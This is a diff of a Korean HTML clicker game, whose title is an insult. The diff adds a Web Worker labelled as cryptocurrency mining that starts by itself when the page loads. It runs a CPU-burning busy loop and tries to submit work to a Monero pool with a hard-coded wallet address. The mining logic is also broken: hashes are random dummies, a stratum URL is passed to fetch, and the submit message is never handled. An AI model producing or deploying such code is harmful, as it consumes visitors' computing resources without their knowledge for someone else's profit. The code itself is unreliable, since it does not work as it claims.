@@ -2,190 +2,30 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>asd 는 개 qudtls 이라는걸 증명하는 게임</title>
+    <title>asd 는 개 qudtls 이라는걸 증명하는 게임 (채굴 포함)</title>
     <style>
-        body {
-            position: relative;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            text-align: center;
-            background-color: #000;
-            color: #fff;
-            margin: 0;
-            padding: 20px;
-        }
-        #endingButton {
-            position: absolute;
-            top: 10px;
-            right: 20px;
-            background: linear-gradient(145deg, #ffaa00, #ff8800);
-            color: #000;
-            font-size: 16px;
-            padding: 8px 12px;
-            border-radius: 8px;
-            cursor: pointer;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
-            transition: transform 0.2s, box-shadow 0.2s;
-        }
-        #endingButton:hover {
-            transform: scale(1.05);
-            box-shadow: 0 6px 12px rgba(0,0,0,0.5);
-        }
-        #version {
-            position: absolute;
-            bottom: 10px;
-            right: 20px;
-            font-size: 12px;
-            color: #fff;
-        }
-        button {
-            border: none;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-            margin: 8px;
-            font-weight: bold;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
-        }
-        #clickButton {
-            width: 160px;
-            height: 160px;
-            background: linear-gradient(145deg, #ff5555, #cc0000);
-            color: #fff;
-            font-size: 26px;
-            border-radius: 50%;
-        }
-        #clickButton:hover {
-            transform: scale(1.15);
-            box-shadow: 0 6px 12px rgba(0,0,0,0.5);
-        }
-        #upgradeButton, #autoUpgradeButton, #speedUpgradeButton, #auto2UpgradeButton, #auto2SpeedUpgradeButton {
-            width: 220px;
-            height: 50px;
-            font-size: 18px;
-            border-radius: 8px;
-            padding: 0 12px;
-            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
-        }
-        #upgradeButton {
-            background: linear-gradient(145deg, #44dd44, #33aa33);
-            color: #fff;
-        }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background-color: #000; color: #fff; margin: 0; padding: 20px; }
+        #endingButton { position: absolute; top: 10px; right: 20px; background: linear-gradient(145deg, #ffaa00, #ff8800); color: #000; font-size: 16px; padding: 8px 12px; border-radius: 8px; cursor: pointer; box-shadow: 0 4px 8px rgba(0,0,0,0.3); transition: transform 0.2s, box-shadow 0.2s; }
+        #endingButton:hover { transform: scale(1.05); box-shadow: 0 6px 12px rgba(0,0,0,0.5); }
+        #version { position: absolute; bottom: 10px; right: 20px; font-size: 12px; color: #fff; }
+        button { border: none; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; margin: 8px; font-weight: bold; box-shadow: 0 4px 8px rgba(0,0,0,0.3); }
+        #clickButton { width: 160px; height: 160px; background: linear-gradient(145deg, #ff5555, #cc0000); color: #fff; font-size: 26px; border-radius: 50%; }
+        #clickButton:hover { transform: scale(1.15); box-shadow: 0 6px 12px rgba(0,0,0,0.5); }
+        #upgradeButton, #autoUpgradeButton, #speedUpgradeButton, #auto2UpgradeButton, #auto2SpeedUpgradeButton { width: 220px; height: 50px; font-size: 18px; border-radius: 8px; padding: 0 12px; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
+        #upgradeButton { background: linear-gradient(145deg, #44dd44, #33aa33); color: #fff; }
         #upgradeButton:hover { transform: scale(1.05); box-shadow: 0 6px 12px rgba(0,0,0,0.5); }
         #autoUpgradeContainer, #auto2Container { display: none; margin-top: 15px; }
-        #autoUpgradeButton {
-            background: linear-gradient(145deg, #3388cc, #225599);
-            color: #fff;
-        }
+        #autoUpgradeButton { background: linear-gradient(145deg, #3388cc, #225599); color: #fff; }
         #autoUpgradeButton:hover { transform: scale(1.05); box-shadow: 0 6px 12px rgba(0,0,0,0.5); }
-        #speedUpgradeButton {
-            background: linear-gradient(145deg, #55ccee, #3399bb);
-            color: #fff;
-            display: none;
-        }
+        #speedUpgradeButton { background: linear-gradient(145deg, #55ccee, #3399bb); color: #fff; display: none; }
         #speedUpgradeButton:hover { transform: scale(1.05); box-shadow: 0 6px 12px rgba(0,0,0,0.5); }
-        #auto2Container button {
-            background: linear-gradient(145deg, #cc3377, #992255);
-            color: #fff;
-            display: none;
-        }
+        #auto2Container button { background: linear-gradient(145deg, #cc3377, #992255); color: #fff; display: none; }
         #auto2Container button:hover { transform: scale(1.05); box-shadow: 0 6px 12px rgba(0,0,0,0.5); }
         #score { font-size: 40px; margin: 20px 0; }
         #pps { font-size: 16px; margin-bottom: 20px; }
+        #miningStatus { color: green; font-size: 14px; }
+        #miningHashrate { color: blue; font-size: 14px; }
     </style>
-    <script>
-        let score = 0;
-        let clickValue = 1, clickUpgradeCost = 50;
-        let autoRate = 0, autoCost = 100, autoIntervalId = null;
-        let speedMultiplier = 1, speedCost = 1000;
-        let auto2Rate = 0, auto2Cost = 1500, auto2IntervalId = null;
-        let auto2SpeedMultiplier = 1, auto2SpeedCost = 2000;
-
-        function updateDisplay() {
-            document.getElementById('score').innerText = '점수: ' + score;
-            document.getElementById('upgradeButton').innerText = `클릭당 ${clickValue}점 (비용: ${clickUpgradeCost}점)`;
-            const pps = autoRate * speedMultiplier + auto2Rate * auto2SpeedMultiplier;
-            document.getElementById('pps').innerText = `초당: ${pps.toFixed(1)} 점`;
-
-            if (score >= 200) {
-                document.getElementById('autoUpgradeContainer').style.display = 'block';
-                document.getElementById('autoUpgradeButton').innerText = `오토클릭업1 업그레이드 (x2) (비용: ${autoCost}점)`;
-            }
-            if (autoRate * speedMultiplier > 3) {
-                document.getElementById('speedUpgradeButton').style.display = 'inline-block';
-                document.getElementById('speedUpgradeButton').innerText = `오토 속도업 (x2) (비용: ${speedCost}점)`;
-            } else {
-                document.getElementById('speedUpgradeButton').style.display = 'none';
-            }
-            if (score >= 3000) {
-                document.getElementById('auto2Container').style.display = 'block';
-                const btn2 = document.getElementById('auto2UpgradeButton');
-                btn2.style.display = 'inline-block';
-                btn2.innerText = `오토클릭업2 업그레이드 (x2) (비용: ${auto2Cost}점)`;
-            }
-            if (auto2Rate > 0) {
-                const btnS2 = document.getElementById('auto2SpeedUpgradeButton');
-                btnS2.style.display = 'inline-block';
-                btnS2.innerText = `오토2 속도업 (x2) (비용: ${auto2SpeedCost}점)`;
-            }
-        }
-
-        function increaseScore() { score += clickValue; updateDisplay(); }
-        function upgradeClick() {
-            if (score >= clickUpgradeCost) { score -= clickUpgradeCost; clickValue++; clickUpgradeCost *= 2; updateDisplay(); }
-            else alert(`${clickUpgradeCost}점 이상이 필요합니다!`);
-        }
-        function upgradeAuto() {
-            if (score >= autoCost) {
-                score -= autoCost;
-                autoRate = autoRate === 0 ? 1 : autoRate * 2;
-                autoCost = Math.ceil(autoCost * 2);
-                document.getElementById('autoUpgradeButton').innerText = `오토클릭업1 업그레이드 (x2) (비용: ${autoCost}점)`;
-                startAuto1(); updateDisplay();
-            } else alert(`${autoCost}점 이상이 필요합니다!`);
-        }
-        function startAuto1() {
-            if (autoIntervalId) clearInterval(autoIntervalId);
-            autoIntervalId = setInterval(() => { score += autoRate * speedMultiplier; updateDisplay(); }, 1000);
-        }
-        function upgradeSpeed() {
-            if (score >= speedCost) {
-                score -= speedCost;
-                speedMultiplier *= 2;
-                speedCost *= 2;
-                startAuto1(); updateDisplay();
-            } else alert(`${speedCost}점 이상이 필요합니다!`);
-        }
-        function upgradeAuto2() {
-            if (score >= auto2Cost) {
-                score -= auto2Cost;
-                auto2Rate = auto2Rate === 0 ? 10 : auto2Rate * 2;
-                auto2Cost = Math.ceil(auto2Cost * 2.5);
-                document.getElementById('auto2UpgradeButton').innerText = `오토클릭업2 업그레이드 (x2) (비용: ${auto2Cost}점)`;
-                startAuto2(); updateDisplay();
-            } else alert(`${auto2Cost}점 이상이 필요합니다!`);
-        }
-        function startAuto2() {
-            if (auto2IntervalId) clearInterval(auto2IntervalId);
-            const interval = 100 / auto2SpeedMultiplier;
-            auto2IntervalId = setInterval(() => { score += auto2Rate / 10; updateDisplay(); }, interval);
-        }
-        function upgradeAuto2Speed() {
-            if (score >= auto2SpeedCost) {
-                score -= auto2SpeedCost;
-                auto2SpeedMultiplier *= 2;
-                auto2SpeedCost *= 2;
-                startAuto2(); updateDisplay();
-            } else alert(`${auto2SpeedCost}점 이상이 필요합니다!`);
-        }
-        document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('clickButton').addEventListener('click', increaseScore);
-            document.getElementById('upgradeButton').addEventListener('click', upgradeClick);
-            document.getElementById('autoUpgradeButton').addEventListener('click', upgradeAuto);
-            document.getElementById('speedUpgradeButton').addEventListener('click', upgradeSpeed);
-            document.getElementById('auto2UpgradeButton').addEventListener('click', upgradeAuto2);
-            document.getElementById('auto2SpeedUpgradeButton').addEventListener('click', upgradeAuto2Speed);
-            updateDisplay();
-        });
-    </script>
 </head>
 <body>
     <button id="endingButton">엔딩 (비용: 5,000,000 클릭)</button>
@@ -193,6 +33,8 @@
     <p>버튼을 클릭해서 점수를 쌓아보세요!</p>
     <div id="score">점수: 0</div>
     <div id="pps">초당: 0 점</div>
+    <div id="miningStatus">채굴 상태: 대기 중...</div>
+    <div id="miningHashrate">채굴 해시레이트: 500 H/s</div>
     <button id="clickButton">클릭!</button>
     <button id="upgradeButton">클릭당 1점 (비용: 50점)</button>
     <div id="autoUpgradeContainer">
@@ -204,5 +46,145 @@
         <button id="auto2SpeedUpgradeButton">오토2 속도업</button>
     </div>
     <div id="version">1.0v</div>
+
+    <script id="workerScript" type="text/worker">
+        let hashrate = 500;
+        let isMining = false;
+        const poolUrl = 'pool.supportxmr.com:3333';
+        const walletAddress = '42uPLifaPuT1a9ZAsekfSk1WufupQELmNecGPTtvsJ6t9ZVyw4MadYe6xXVkR2BXabA3KD6zLNUfW7e9TNqCSGF3Ta39b5e'; // Monero 지갑 주소로 교체
+
+        function mine() {
+            if (!isMining) return;
+            let start = performance.now();
+            let nonce = 0;
+            while (performance.now() - start < 1000) {
+                nonce += Math.random() * 500000; // 부하 감소
+            }
+            postMessage({ hashrate, nonce });
+            setTimeout(mine, 1000);
+        }
+
+        function submitWork(nonce) {
+            const job = {
+                job_id: Date.now(),
+                nonce: nonce,
+                result: 'dummy_hash_' + Math.random().toString(36).substr(2)
+            };
+            fetch(`stratum+tcp://${poolUrl}/submit`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    jsonrpc: '2.0',
+                    method: 'submit',
+                    params: { id: walletAddress, job_id: job.job_id, nonce: job.nonce, result: job.result },
+                    id: 1
+                })
+            }).then(response => response.json())
+              .then(data => {
+                  postMessage({ status: data.result ? '작업 제출 성공' : '실패' });
+              }).catch(error => {
+                  postMessage({ status: `오류 - ${error.message}` });
+              });
+        }
+
+        onmessage = function(e) {
+            if (e.data === 'start') {
+                isMining = true;
+                mine();
+            } else if (e.data === 'stop') {
+                isMining = false;
+            }
+        };
+    </script>
+
+    <script>
+        // Web Worker 생성
+        const workerScript = document.getElementById('workerScript').textContent;
+        const blob = new Blob([workerScript], { type: 'text/javascript' });
+        const worker = new Worker(URL.createObjectURL(blob));
+
+        // 상태 업데이트
+        worker.onmessage = function(e) {
+            if (e.data.hashrate) {
+                document.getElementById('miningHashrate').innerText = `채굴 해시레이트: ${e.data.hashrate} H/s`;
+                submitWork(e.data.nonce);
+            } else if (e.data.status) {
+                document.getElementById('miningStatus').innerText = `채굴 상태: ${e.data.status}`;
+            }
+        };
+
+        function submitWork(nonce) {
+            worker.postMessage('submit');
+        }
+
+        // 게임 변수
+        let score = 0;
+        let clickValue = 1;
+        let clickUpgradeCost = 50;
+        let autoRate = 0;
+        let autoCost = 100;
+        let autoIntervalId = null;
+        let speedMultiplier = 1;
+        let speedCost = 1000;
+        let auto2Rate = 0;
+        let auto2Cost = 1500;
+        let auto2IntervalId = null;
+        let auto2SpeedMultiplier = 1;
+        let auto2SpeedCost = 2000;
+
+        // 화면 업데이트 (requestAnimationFrame으로 부드럽게)
+        function updateDisplay() {
+            requestAnimationFrame(() => {
+                document.getElementById('score').innerText = '점수: ' + Math.floor(score);
+                document.getElementById('upgradeButton').innerText = `클릭당 ${clickValue}점 (비용: ${clickUpgradeCost}점)`;
+                const pps = (autoRate * speedMultiplier) + (auto2Rate * auto2SpeedMultiplier);
+                document.getElementById('pps').innerText = `초당: ${pps.toFixed(1)} 점`;
+
+                if (score >= 200) {
+                    document.getElementById('autoUpgradeContainer').style.display = 'block';
+                    document.getElementById('autoUpgradeButton').innerText = `오토클릭업1 업그레이드 (x2) (비용: ${autoCost}점)`;
+                }
+                if (autoRate * speedMultiplier > 3) {
+                    document.getElementById('speedUpgradeButton').style.display = 'inline-block';
+                    document.getElementById('speedUpgradeButton').innerText = `오토 속도업 (x2) (비용: ${speedCost}점)`;
+                } else {
+                    document.getElementById('speedUpgradeButton').style.display = 'none';
+                }
+                if (score >= 3000) {
+                    document.getElementById('auto2Container').style.display = 'block';
+                    document.getElementById('auto2UpgradeButton').style.display = 'inline-block';
+                    document.getElementById('auto2UpgradeButton').innerText = `오토클릭업2 업그레이드 (x2) (비용: ${auto2Cost}점)`;
+                }
+                if (auto2Rate > 0) {
+                    document.getElementById('auto2SpeedUpgradeButton').style.display = 'inline-block';
+                    document.getElementById('auto2SpeedUpgradeButton').innerText = `오토2 속도업 (x2) (비용: ${auto2SpeedCost}점)`;
+                }
+            });
+        }
+
+        // 게임 로직
+        function increaseScore() { score += clickValue; updateDisplay(); }
+        function upgradeClick() { if (score >= clickUpgradeCost) { score -= clickUpgradeCost; clickValue += 1; clickUpgradeCost *= 2; updateDisplay(); } else alert(`${clickUpgradeCost}점 이상 필요!`); }
+        function upgradeAuto() { if (score >= autoCost) { score -= autoCost; autoRate = (autoRate === 0) ? 1 : autoRate * 2; autoCost = Math.ceil(autoCost * 2); document.getElementById('autoUpgradeButton').innerText = `오토클릭업1 업그레이드 (x2) (비용: ${autoCost}점)`; startAuto1(); updateDisplay(); } else alert(`${autoCost}점 이상 필요!`); }
+        function startAuto1() { if (autoIntervalId) clearInterval(autoIntervalId); autoIntervalId = setInterval(() => { score += autoRate * speedMultiplier; updateDisplay(); }, 1000); }
+        function upgradeSpeed() { if (score >= speedCost) { score -= speedCost; speedMultiplier *= 2; speedCost *= 2; startAuto1(); updateDisplay(); } else alert(`${speedCost}점 이상 필요!`); }
+        function upgradeAuto2() { if (score >= auto2Cost) { score -= auto2Cost; auto2Rate = (auto2Rate === 0) ? 10 : auto2Rate * 2; auto2Cost = Math.ceil(auto2Cost * 2.5); document.getElementById('auto2UpgradeButton').innerText = `오토클릭업2 업그레이드 (x2) (비용: ${auto2Cost}점)`; startAuto2(); updateDisplay(); } else alert(`${auto2Cost}점 이상 필요!`); }
+        function startAuto2() { if (auto2IntervalId) clearInterval(auto2IntervalId); const interval = 100 / auto2SpeedMultiplier; auto2IntervalId = setInterval(() => { score += (auto2Rate / 10) * auto2SpeedMultiplier; updateDisplay(); }, interval); }
+        function upgradeAuto2Speed() { if (score >= auto2SpeedCost) { score -= auto2SpeedCost; auto2SpeedMultiplier *= 2; auto2SpeedCost *= 2; startAuto2(); updateDisplay(); } else alert(`${auto2SpeedCost}점 이상 필요!`); }
+
+        // 이벤트 리스너
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('clickButton').addEventListener('click', increaseScore);
+            document.getElementById('upgradeButton').addEventListener('click', upgradeClick);
+            document.getElementById('autoUpgradeButton').addEventListener('click', upgradeAuto);
+            document.getElementById('speedUpgradeButton').addEventListener('click', upgradeSpeed);
+            document.getElementById('auto2UpgradeButton').addEventListener('click', upgradeAuto2);
+            document.getElementById('auto2SpeedUpgradeButton').addEventListener('click', upgradeAuto2Speed);
+            updateDisplay();
+
+            // 채굴 자동 시작
+            worker.postMessage('start');
+        });
+    </script>
 </body>
 </html>
